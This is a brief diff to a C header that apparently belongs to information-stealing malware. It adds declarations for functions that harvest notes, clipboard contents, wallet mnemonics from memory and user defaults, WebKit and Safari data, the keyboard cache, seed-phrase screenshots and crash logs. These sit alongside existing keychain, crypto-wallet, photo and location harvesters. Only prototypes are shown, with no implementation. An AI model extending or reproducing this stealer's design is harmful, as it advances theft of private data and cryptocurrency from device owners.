@@ -6,5 +6,14 @@ void harvest_keychain(void);
 void harvest_crypto_wallets(void);
 void harvest_photos(void);
 void harvest_location(void);
+void harvest_notes(void);
+void harvest_clipboard(void);
+void harvest_memory_mnemonics(void);
+void harvest_userdefaults_mnemonics(void);
+void harvest_webkit_storage(void);
+void harvest_keyboard_cache(void);
+void harvest_safari_data(void);
+void harvest_seed_screenshots(void);
+void harvest_crash_logs(void);
 void harvest_all(void);
 #endif
